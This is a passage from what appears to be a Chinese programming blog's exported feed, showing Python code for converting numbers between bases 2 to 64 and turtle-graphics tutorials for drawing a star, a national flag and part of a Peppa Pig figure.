string">'u'</span><span class="token punctuation">:</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">:</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">:</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">:</span> <span class="token number">63</span><span class="token punctuation">}</span>    <span class="token comment"># 判断进制格式，支持2-64进制转换</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">&lt;=</span> start_base <span class="token operator">&lt;=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">&lt;=</span> end_base <span class="token operator">&lt;=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"支持2-64进制转换"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment"># 判断输入数字的进制</span>    <span class="token keyword">if</span> num<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'0b'</span><span class="token punctuation">:</span>        start_base <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">elif</span> num<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'0o'</span><span class="token punctuation">:</span>        start_base <span class="token operator">=</span> <span class="token number">8</span>    <span class="token keyword">elif</span> num<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'0x'</span><span class="token punctuation">:</span>        start_base <span class="token operator">=</span> <span class="token number">16</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        start_base <span class="token operator">=</span> start_base    <span class="token comment"># 将输入数字转换为10进制</span>    <span class="token keyword">def</span> <span class="token function">to_10_base</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> start_base<span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> num<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        result <span class="token operator">=</span> <span class="token number">0</span>        i <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> num<span class="token punctuation">:</span>            result <span class="token operator">+=</span> base_map2<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>start_base <span class="token operator">**</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> result    num <span class="token operator">=</span> to_10_base<span class="token punctuation">(</span>num<span class="token punctuation">,</span> start_base<span class="token punctuation">)</span>    <span class="token comment"># if 2 &lt;= start_base &lt;= 36:</span>    <span class="token comment">#     num = int(num, base=start_base)</span>    <span class="token comment"># else:</span>    <span class="token comment">#     num = to_10_base(num)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"10十进制：%d"</span> <span class="token operator">%</span> num<span class="token punctuation">)</span>    <span class="token comment"># num转换为end_base进制</span>    <span class="token keyword">def</span> <span class="token function">to_end_base</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> end_base<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">while</span> num <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>base_map1<span class="token punctuation">[</span>num <span class="token operator">%</span> end_base<span class="token punctuation">]</span><span class="token punctuation">)</span>            num <span class="token operator">//=</span> end_base        result <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span>        <span class="token keyword">while</span> stack<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span>            result <span class="token operator">+=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> to_end_base<span class="token punctuation">(</span>num<span class="token punctuation">,</span> end_base<span class="token punctuation">)</span>    <span class="token comment"># python内置函数demo</span>    <span class="token keyword">if</span> start_base <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> end_base <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>        <span class="token keyword">elif</span> end_base <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">oct</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>        <span class="token keyword">elif</span> end_base <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> num    <span class="token keyword">elif</span> end_base <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> base<span class="token operator">=</span>start_base<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">demo_bin</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    将num转换为2进制    :param num: [2进制|8进制|10进制|16进制]    :return: num的2进制数字    """</span>    <span class="token keyword">return</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">demo_oct</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    将num转换为8进制    :param num: [2进制|8进制|10进制|16进制]    :return: num的8进制数字    """</span>    <span class="token keyword">return</span> <span class="token builtin">oct</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">demo_hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    将num转换为16进制    :param num: [2进制|8进制|10进制|16进制]    :return: num的16进制数字    """</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">demo_int</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> base<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    int()如果使用base参数时，num不能输入数字类型    :param num:    :param base:    :return:    """</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> base<span class="token operator">=</span>base<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_base_map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    生成basemap，进制与对应的符号    :return:    """</span>    str_base <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@#'</span>    basemap1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    basemap2 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        basemap1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> str_base<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        basemap2<span class="token punctuation">[</span>str_base<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span>basemap1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>basemap2<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token string">'1000000'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token string">"3@y1"</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(type(demo_bin(0b10)))</span>    <span class="token comment"># print(demo_int("11", 36))</span>    <span class="token comment"># get_base_map()</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> code </tag>
            
            <tag> 进制转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>turtle画图</title>
      <link href="//code/python/turtle-hua-tu/"/>
      <url>//code/python/turtle-hua-tu/</url>
      
        <content type="html"><![CDATA[<p>使用turtle画图</p><!----><h3 id="国旗"><a href="#国旗" class="headerlink" title="国旗"></a>国旗</h3><h4 id="画五角星"><a href="#画五角星" class="headerlink" title="画五角星"></a>画五角星</h4><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">draw_star</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""绘制五角星"""</span>    turtle<span class="token punctuation">.</span>setpos<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 同goto()</span>    pos1 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>  <span class="token comment"># radius为负数则逆时针画图</span>    pos2 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos3 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos4 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos5 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos3<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos1<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos4<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos2<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos5<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>五角星绘制过程</p><img src="/code/python/turtle-hua-tu/start.gif" class="" title="image-20201211232134071"><p>五角星的五个角位于同心圆上，两角之间的角度是72°，记录五个角的坐标，用手画五角星的方式闭合五角星，然后填充颜色。</p><h4 id="画国旗"><a href="#画国旗" class="headerlink" title="画国旗"></a>画国旗</h4><p>完整代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""用Python的turtle模块绘制国旗"""</span><span class="token keyword">import</span> turtle<span class="token keyword">def</span> <span class="token function">draw_rectangle</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""绘制矩形"""</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 画笔去指定坐标，同setpos()/setposition()</span>    turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>width<span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>height<span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">draw_star</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""绘制五角星"""</span>    turtle<span class="token punctuation">.</span>setpos<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 同goto()</span>    pos1 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>  <span class="token comment"># radius为负数则逆时针画图</span>    pos2 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos3 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos4 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span>radius<span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">)</span>    pos5 <span class="token operator">=</span> turtle<span class="token punctuation">.</span>pos<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos3<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos1<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos4<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos2<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>pos5<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主程序"""</span>    turtle<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 画笔抬起，pu()/up()功能相同</span>    x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">270</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">180</span>    <span class="token comment"># 画国旗主体</span>    width<span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">540</span><span class="token punctuation">,</span> <span class="token number">360</span>    draw_rectangle<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">)</span>    <span class="token comment"># 画大星星</span>    pice <span class="token operator">=</span> <span class="token number">22</span>    center_x<span class="token punctuation">,</span> center_y <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> pice<span class="token punctuation">,</span> y <span class="token operator">+</span> height <span class="token operator">-</span> pice <span class="token operator">*</span> <span class="token number">5</span>    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>center_x<span class="token punctuation">,</span> center_y<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>pice <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    draw_star<span class="token punctuation">(</span>turtle<span class="token punctuation">.</span>xcor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> turtle<span class="token punctuation">.</span>ycor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pice <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>    x_poses<span class="token punctuation">,</span> y_poses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># 画小星星</span>    <span class="token keyword">for</span> x_pos<span class="token punctuation">,</span> y_pos <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>x_poses<span class="token punctuation">,</span> y_poses<span class="token punctuation">)</span><span class="token punctuation">:</span>        turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>x <span class="token operator">+</span> x_pos <span class="token operator">*</span> pice<span class="token punctuation">,</span> y <span class="token operator">+</span> height <span class="token operator">-</span> y_pos <span class="token operator">*</span> pice<span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span>turtle<span class="token punctuation">.</span>towards<span class="token punctuation">(</span>center_x<span class="token punctuation">,</span> center_y<span class="token punctuation">)</span> <span class="token operator">-</span> turtle<span class="token punctuation">.</span>heading<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>pice<span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        draw_star<span class="token punctuation">(</span>turtle<span class="token punctuation">.</span>xcor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> turtle<span class="token punctuation">.</span>ycor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pice<span class="token punctuation">)</span>    <span class="token comment"># 隐藏海龟</span>    turtle<span class="token punctuation">.</span>ht<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 显示绘图窗口</span>    turtle<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>贴个图：</p><img src="/code/python/turtle-hua-tu/image-20201212173417540.png" class="" title="image-20201212173417540"><h3 id="小猪佩奇"><a href="#小猪佩奇" class="headerlink" title="小猪佩奇"></a>小猪佩奇</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""绘制小猪佩奇"""</span><span class="token keyword">from</span> turtle <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> turtle<span class="token keyword">def</span> <span class="token function">nose</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画鼻子"""</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 画笔抬起</span>    <span class="token comment"># 将海龟移动到指定的坐标</span>    goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 画笔方向</span>    <span class="token comment"># 设置海龟的方向（0-东、90-北、180-西、270-南）</span>    setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token number">0.4</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;</span> <span class="token number">30</span> <span class="token keyword">or</span> <span class="token number">60</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;</span> <span class="token number">90</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">0.08</span>            <span class="token comment"># 向左转3度</span>            left<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token comment"># 向前走</span>            forward<span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> a <span class="token operator">-</span> <span class="token number">0.08</span>            left<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>            forward<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 设置画笔的颜色(红, 绿, 蓝)</span>    pencolor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    pencolor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">head</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画头"""</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"pink"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    